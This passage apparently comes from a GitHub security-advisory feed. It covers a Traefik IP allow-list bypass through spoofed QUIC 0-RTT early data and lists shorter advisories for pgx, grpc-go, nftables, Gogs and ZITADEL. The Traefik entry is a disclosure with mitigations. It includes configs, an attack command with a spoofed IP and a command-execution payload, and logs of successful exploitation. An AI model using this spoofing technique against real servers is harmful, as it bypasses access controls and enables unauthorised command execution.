h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:57 &gt; Setting up IPAllowLister with sourceRange: [1.3.3.7/32] entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/observability/middleware.go:33 &gt; Adding tracing to middleware entryPointName=websecure middlewareName=ipfilter@file routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/recovery/recovery.go:22 &gt; Creating middleware entryPointName=websecure middlewareName=traefik-internal-recovery middlewareType=Recover

# Attack script establishes an HTTP/3 connection to traefik to obtain a session ticket
attack-ipspoofing-1  | INFO:client:Initially connecting to server to get a session ticket
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] ALPN negotiated protocol h3
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] Connection close sent (code 0x0, reason )
attack-ipspoofing-1  | INFO:client:Initial connection done

# Traefik accepts the HTTP/3 connection and issues as session ticket 
h3_traefik-1         | 2024-06-29T11:53:03Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:228 &gt; Serving default certificate for request: ""

# Attack script sends a 0-RTT early data request in a UDP datagram with a spoofed source IP
attack-ipspoofing-1  | INFO:client:Building 0-RTT QUIC packet
attack-ipspoofing-1  | INFO:client:Setting up iptables rule for source IP spoofing
attack-ipspoofing-1  | INFO:client:Sending 0-RTT packet

# Traefik accepts and forwards the request to the backend service, bypassing the IP allow list
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:85 &gt; Accepting IP 1.3.3.7 middlewareName=ipfilter@file middlewareType=IPAllowLister
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/server/service/loadbalancer/wrr/wrr.go:196 &gt; Service selected by WRR: 754e0da3b063885a

# Backend service receives and processes the request
backend-1            | INFO:root:Request: {"ip": "1.3.3.7", "method": "POST", "path": "/cmd", "data": "cmd=echo%20worked&gt;&gt;/tmp/spoofed", "headers": {"Host": "127.0.0.1:4439", "Content-Length": "31", "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "1.3.3.7", "X-Forwarded-Host": "127.0.0.1:4439", "X-Forwarded-Port": "4439", "X-Forwarded-Proto": "https", "X-Forwarded-Server": "work", "X-Header": "test", "X-Real-Ip": "1.3.3.7", "Accept-Encoding": "gzip"}}
backend-1            | INFO:root:Executing command: echo worked&gt;&gt;/tmp/spoofed
</code></pre>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9">https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39321">https://nvd.nist.gov/vuln/detail/CVE-2024-39321</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
<li><a href="https://github.com/advisories/GHSA-gxrv-wf35-62w9">https://github.com/advisories/GHSA-gxrv-wf35-62w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gxrv-wf35-62w9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T20:13:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik] Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes]]></title>
        <id>https://github.com/advisories/GHSA-gxrv-wf35-62w9</id>
        <link href="https://github.com/advisories/GHSA-gxrv-wf35-62w9"/>
        <updated>2024-07-05T20:13:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows bypassing IP allow-lists via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary
Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.


<h3 id="details">Details</h3>
<p>HTTP/3 supports sending HTTP requests as early data during QUIC 0-RTT handshakes to reduce RTT overhead for connection resumptions. Early data is sent and received before the handshake is completed and the client's IP address is validated.
The initial packet containing the QUIC 0-RTT handshake information and the early data HTTP request are sent as a single UDP datagram. Due to UDP being used by QUIC, the source IP address can be spoofed. When HTTP/3 servers process early data requests, the application layer only sees the unvalidated - possibly spoofed - IP address.</p>
<p>First, attackers have to obtain a session ticket from the HTTP/3 server. For that, attackers have to establish an HTTP/3 connection to the server - using their real IP address - and wait for the server to send a session ticket. Note that attackers do not have to send an actual HTTP request over the established connection. After obtaining the session ticket, the attacker can close the connection. In the second step, attackers need to prepare a UDP datagram containing a QUIC initial packet with a TLS ClientHello and the session ticket, a QUIC 0-RTT packet with early data encrypted with the pre-shared key from the session ticket, and an HTTP/3 request (open request stream, HEADERS frame, optionally DATA frame). This prepared UDP datagram can then be sent to the server with an arbitrarily spoofed source IP address in the IP packet header. When processing the HTTP request, the server trusts the spoofed IP address, which can be used to bypass IP-allow/block-lists.</p>
<p>A prerequisite for this attack to succeed is that HTTP/3 servers have implemented and enabled 0-RTT early data for HTTP/3 requests (and no mitigations are in place). A caveat is that attackers are not able to receive the server's response because the response is sent to the spoofed source IP address, making it a blind attack. Another limitation is that the request has to fit in a single UDP datagram, whose size is limited by the network path's MTU (minus some bytes for headers of encapsulating protocols such as HTTP/3, QUIC, UDP, IPv4/IPv6).</p>
<h3 id="impact-1">Impact</h3>
<p>IP allow-lists can be bypassed. Early data in QUIC 0-RTT handshakes is enabled when HTTP/3 support is enabled.</p>
<h3 id="mitigation">Mitigation</h3>
<ul>
<li>Consider responding with HTTP status code 425 Too Early when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware. See RFC 8470 Section 3 for more information.</li>
<li>Alternatively, delay processing of 0-RTT early data requests until the handshake is completed and the client's IP address is validated when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware.</li>
</ul>
<p>Additionally, it is recommended to implement RFC 8470 and set the <code>Early-Data: 1</code> header when forwarding early data requests to backend services. Currently, applications are not able to distinguish between 0-RTT early data requests and regular requests. When applications use the client's IP in <code>X-Forwarded-For</code> headers (e.g. for rate limiting), they are not able to detect potential IP spoofing on the application layer.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Traefik is used as a HTTP/3 reverse proxy for a backend application. An IP allow list is configured to only allow access from the IP address 1.3.3.7.</p>
<pre><code class="language-yaml"># /etc/traefik/traefik.yml
entryPoints:
  websecure:
    address: ":4439"
    http3: {}
    asDefault: true

providers:
  file:
    filename: /etc/traefik/provider.yml

log:
  level: DEBUG
</code></pre>
<pre><code class="language-yaml"># /etc/traefik/provider.yml
http:
  routers:
    default:
      rule: "PathPrefix(`/`)"
      tls: {}
      middlewares:
        - ipfilter
      service: backend
  
  middlewares:
    ipfilter:
      ipAllowList:
        sourceRange:
          - "1.3.3.7/32"

  services:
    backend:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8000"
</code></pre>
<p>By performing the steps described above, attackers are able to bypass the IP allow list and send requests to the backend application. The security impact depends on the application's logic.</p>
<p>Please find attached a proof-of-concept docker-compose setup to demonstrate the vulnerability. It consists of a traefik reverse proxy, a backend application, and an attacker container. The attack script performs following request:</p>
<pre><code>python3 http3_ip_spoofing.py https://127.0.0.1:4439/cmd -X POST -d "cmd=echo%20worked&gt;&gt;/tmp/spoofed" -H "X-Header: test" --spoofed-ip=1.3.3.7
</code></pre>
<p>Note: We use a custom python script because, <code>curl</code> does not support QUIC 0-RTT requests and session resumtion yet.</p>
<p><a href="https://github.com/user-attachments/files/16044048/proof-of-concept.zip">proof-of-concept.zip</a></p>
<p>Here are logs of a successful exploitation in the attached docker compose setup:</p>
<pre><code>docker compose up

# Traefik startup logs
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:100 &gt; Traefik version 3.0.3 built on 2024-06-18T14:31:20Z version=3.0.3
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/cmd/traefik/traefik.go:107 &gt; Static configuration loaded [json] staticConfiguration={"entryPoints":{"websecure":{"address":":4439","asDefault":true,"forwardedHeaders":{},"http":{},"http2":{"maxConcurrentStreams":250},"http3":{},"transport":{"lifeCycle":{"graceTimeOut":"10s"},"respondingTimeouts":{"idleTimeout":"3m0s","readTimeout":"1m0s"}},"udp":{"timeout":"3s"}}},"global":{"checkNewVersion":true},"log":{"format":"common","level":"DEBUG"},"providers":{"file":{"filename":"/etc/traefik/provider.yml","watch":true},"providersThrottleDuration":"2s"},"serversTransport":{"maxIdleConnsPerHost":200},"tcpServersTransport":{"dialKeepAlive":"15s","dialTimeout":"30s"}}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:605 &gt; 
h3_traefik-1         | Stats collection is disabled.
h3_traefik-1         | Help us improve Traefik by turning this feature on :)
h3_traefik-1         | More details on: https://doc.traefik.io/traefik/contributing/data-collection/
h3_traefik-1         | 
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:73 &gt; Starting provider aggregator aggregator.ProviderAggregator
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/server_entrypoint_tcp.go:220 &gt; Starting TCP Server entryPointName=websecure
h3_traefik-1         | 2024-06-29T11:52:58Z DBG log/log.go:245 &gt; 2024/06/29 11:52:58 sys_conn.go:36: failed to sufficiently increase receive buffer size (was: 208 kiB, wanted: 2048 kiB, got: 416 kiB). See https://github.com/quic-go/quic-go/wiki/UDP-Buffer-Sizes for details.
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *file.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *file.Provider provider configuration config={"filename":"/etc/traefik/provider.yml","watch":true}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik/provider.yml
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *traefik.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *traefik.Provider provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *acme.ChallengeTLSALPN
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *acme.ChallengeTLSALPN provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"middlewares":{"ipfilter":{"ipAllowList":{"sourceRange":["1.3.3.7/32"]}}},"routers":{"default":{"middlewares":["ipfilter"],"rule":"PathPrefix(`/`)","service":"backend","tls":{}}},"services":{"backend":{"loadBalancer":{"passHostHeader":true,"responseForwarding":{"flushInterval":"100ms"},"servers":[{"url":"http://127.0.0.1:8000"}]}}}},"tcp":{},"tls":{},"udp":{}} providerName=file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"serversTransports":{"default":{"maxIdleConnsPerHost":200}},"services":{"noop":{}}},"tcp":{"serversTransports":{"default":{"dialKeepAlive":"15s","dialTimeout":"30s"}}},"tls":{},"udp":{}} providerName=internal
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/aggregator.go:51 &gt; No entryPoint defined for this router, using the default one(s) instead entryPointName=["websecure"] routerName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:321 &gt; No default certificate, fallback to the internal generated certificate tlsStoreName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:259 &gt; Creating load-balancer entryPointName=websecure routerName=default@file serviceName=backend@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:301 &gt; Creating server entryPointName=websecure routerName=default@file serverName=754e0da3b063885a serviceName=backend@file target=http://127.0.0.1:8000
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:33 &gt; Creating middleware entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:57 &gt; Setting up IPAllowLister with sourceRange: [1.3.3.7/32] entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/observability/middleware.go:33 &gt; Adding tracing to middleware entryPointName=websecure middlewareName=ipfilter@file routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/recovery/recovery.go:22 &gt; Creating middleware entryPointName=websecure middlewareName=traefik-internal-recovery middlewareType=Recover

# Attack script establishes an HTTP/3 connection to traefik to obtain a session ticket
attack-ipspoofing-1  | INFO:client:Initially connecting to server to get a session ticket
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] ALPN negotiated protocol h3
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] Connection close sent (code 0x0, reason )
attack-ipspoofing-1  | INFO:client:Initial connection done

# Traefik accepts the HTTP/3 connection and issues as session ticket 
h3_traefik-1         | 2024-06-29T11:53:03Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:228 &gt; Serving default certificate for request: ""

# Attack script sends a 0-RTT early data request in a UDP datagram with a spoofed source IP
attack-ipspoofing-1  | INFO:client:Building 0-RTT QUIC packet
attack-ipspoofing-1  | INFO:client:Setting up iptables rule for source IP spoofing
attack-ipspoofing-1  | INFO:client:Sending 0-RTT packet

# Traefik accepts and forwards the request to the backend service, bypassing the IP allow list
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:85 &gt; Accepting IP 1.3.3.7 middlewareName=ipfilter@file middlewareType=IPAllowLister
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/server/service/loadbalancer/wrr/wrr.go:196 &gt; Service selected by WRR: 754e0da3b063885a

# Backend service receives and processes the request
backend-1            | INFO:root:Request: {"ip": "1.3.3.7", "method": "POST", "path": "/cmd", "data": "cmd=echo%20worked&gt;&gt;/tmp/spoofed", "headers": {"Host": "127.0.0.1:4439", "Content-Length": "31", "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "1.3.3.7", "X-Forwarded-Host": "127.0.0.1:4439", "X-Forwarded-Port": "4439", "X-Forwarded-Proto": "https", "X-Forwarded-Server": "work", "X-Header": "test", "X-Real-Ip": "1.3.3.7", "Accept-Encoding": "gzip"}}
backend-1            | INFO:root:Executing command: echo worked&gt;&gt;/tmp/spoofed
</code></pre>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9">https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39321">https://nvd.nist.gov/vuln/detail/CVE-2024-39321</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
<li><a href="https://github.com/advisories/GHSA-gxrv-wf35-62w9">https://github.com/advisories/GHSA-gxrv-wf35-62w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gxrv-wf35-62w9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T20:13:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgx/v5] Panic in Pipeline when PgConn is busy or closed in github.com/jackc/pgx]]></title>
        <id>https://github.com/advisories/GHSA-fqpg-rq76-99pq</id>
        <link href="https://github.com/advisories/GHSA-fqpg-rq76-99pq"/>
        <updated>2024-07-05T20:08:27.000Z</updated>
        <content type="html"><![CDATA[<p>Pipeline can panic when PgConn is busy or closed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgx/commit/dfd198003a03dbb96e4607b0d3a0bb9a7398ccb7">https://github.com/jackc/pgx/commit/dfd198003a03dbb96e4607b0d3a0bb9a7398ccb7</a></li>
<li><a href="https://github.com/advisories/GHSA-fqpg-rq76-99pq">https://github.com/advisories/GHSA-fqpg-rq76-99pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqpg-rq76-99pq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T20:08:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grpc/grpc-go] Private tokens could appear in logs if context containing gRPC metadata is logged in github.com/grpc/grpc-go]]></title>
        <id>https://github.com/advisories/GHSA-xr7q-jx4m-x55m</id>
        <link href="https://github.com/advisories/GHSA-xr7q-jx4m-x55m"/>
        <updated>2024-07-05T20:07:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This issue represents a potential PII concern.  If applications were printing or logging a context containing gRPC metadata, the affected versions will contain all the metadata, which may include private information.</p>
<h3 id="patches">Patches</h3>
<p>The issue first appeared in 1.64.0 and is patched in 1.64.1 and 1.65.0</p>
<h3 id="workarounds">Workarounds</h3>
<p>If using an affected version and upgrading is not possible, ensuring you do not log or print contexts will avoid the problem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grpc/grpc-go/security/advisories/GHSA-xr7q-jx4m-x55m">https://github.com/grpc/grpc-go/security/advisories/GHSA-xr7q-jx4m-x55m</a></li>
<li><a href="https://github.com/advisories/GHSA-xr7q-jx4m-x55m">https://github.com/advisories/GHSA-xr7q-jx4m-x55m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xr7q-jx4m-x55m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-05T20:07:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/google/nftables] github.com/google/nftable IP addresses were encoded in the wrong byte order]]></title>
        <id>https://github.com/advisories/GHSA-qjvf-8748-9w7h</id>
        <link href="https://github.com/advisories/GHSA-qjvf-8748-9w7h"/>
        <updated>2024-07-05T20:05:17.000Z</updated>
        <content type="html"><![CDATA[<p>In  <a href="https://github.com/google/nftables">https://github.com/google/nftables</a>&nbsp;IP addresses were encoded in the wrong byte order,&nbsp;resulting in an nftables configuration which does not work as intended (might block or not block the desired addresses).</p>
<p>This issue affects:&nbsp; <a href="https://pkg.go.dev/github.com/google/nftables@v0.1.0">https://pkg.go.dev/github.com/google/nftables@v0.1.0</a> </p>
<p>The bug was fixed in the next released version:&nbsp; <a href="https://pkg.go.dev/github.com/google/nftables@v0.2.0">https://pkg.go.dev/github.com/google/nftables@v0.2.0</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6284">https://nvd.nist.gov/vuln/detail/CVE-2024-6284</a></li>
<li><a href="https://github.com/crowdsecurity/cs-firewall-bouncer/issues/368">https://github.com/crowdsecurity/cs-firewall-bouncer/issues/368</a></li>
<li><a href="https://github.com/google/nftables/issues/225">https://github.com/google/nftables/issues/225</a></li>
<li><a href="https://bugs.launchpad.net/ubuntu/+source/crowdsec-firewall-bouncer/+bug/2069596">https://bugs.launchpad.net/ubuntu/+source/crowdsec-firewall-bouncer/+bug/2069596</a></li>
<li><a href="https://github.com/advisories/GHSA-qjvf-8748-9w7h">https://github.com/advisories/GHSA-qjvf-8748-9w7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjvf-8748-9w7h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-04T00:37:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gogs/gogs] Gogs allows argument injection during the tagging of a new release]]></title>
        <id>https://github.com/advisories/GHSA-8mm6-wmpp-mmm3</id>
        <link href="https://github.com/advisories/GHSA-8mm6-wmpp-mmm3"/>
        <updated>2024-07-05T20:04:52.000Z</updated>
        <content type="html"><![CDATA[<p>Gogs through 0.13.0 allows argument injection during the tagging of a new release. This vulnerability is still unfixed as of the time of this advisory being published.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39933">https://nvd.nist.gov/vuln/detail/CVE-2024-39933</a></li>
<li><a href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li>
<li><a href="https://github.com/advisories/GHSA-8mm6-wmpp-mmm3">https://github.com/advisories/GHSA-8mm6-wmpp-mmm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mm6-wmpp-mmm3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-04T18:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gogs/gogs] Gogs allows argument injection during the previewing of changes]]></title>
        <id>https://github.com/advisories/GHSA-hf29-9hfh-w63j</id>
        <link href="https://github.com/advisories/GHSA-hf29-9hfh-w63j"/>
        <updated>2024-07-05T20:04:47.000Z</updated>
        <content type="html"><![CDATA[<p>Gogs through 0.13.0 allows argument injection during the previewing of changes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39932">https://nvd.nist.gov/vuln/detail/CVE-2024-39932</a></li>
<li><a href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li>
<li><a href="https://github.com/advisories/GHSA-hf29-9hfh-w63j">https://github.com/advisories/GHSA-hf29-9hfh-w63j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hf29-9hfh-w63j</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-04T18:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gogs/gogs] Gogs allows deletion of internal files]]></title>
        <id>https://github.com/advisories/GHSA-2vgj-3pvg-xh4w</id>
        <link href="https://github.com/advisories/GHSA-2vgj-3pvg-xh4w"/>
        <updated>2024-07-05T20:04:44.000Z</updated>
        <content type="html"><![CDATA[<p>Gogs through 0.13.0 allows deletion of internal files. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39931">https://nvd.nist.gov/vuln/detail/CVE-2024-39931</a></li>
<li><a href="https://github.com/gogs/gogs/releases">https://github.com/gogs/gogs/releases</a></li>
<li><a href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgj-3pvg-xh4w">https://github.com/advisories/GHSA-2vgj-3pvg-xh4w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgj-3pvg-xh4w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-04T18:31:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Vulnerable to Session Information Leakage]]></title>
        <id>https://github.com/advisories/GHSA-cvw9-c57h-3397</id>
        <link href="https://github.com/advisories/GHSA-cvw9-c57h-3397"/>
        <updated>2024-07-05T20:03:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL provides users the ability to list all user sessions of the current user agent (browser) by API and in the Console UI.</p>
<p>Due to a missing check, user sessions without that information (e.g. when created though the session service) were incorrectly listed exposing potentially other user's sessions.</p>
<p>Note that the Login UI was never affected and there was no possibility to take over such a session.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">2.55.1</a>
2.54.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">2.54.5</a>
2.53.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">2.53.8</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
</ul>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to @cybertransformer, @Avolicious, @AmirhoseinBrz and @srividyaj for finding and reporting the vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397">https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39683">https://nvd.nist.gov/vuln/detail/CVE-2024-39683</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04">https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da">https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73">https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">https://github.com/zitadel/zitadel/releases/tag/v2.53.8</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">https://github.com/zitadel/zitadel/releases/tag/v2.54.5</a></li>
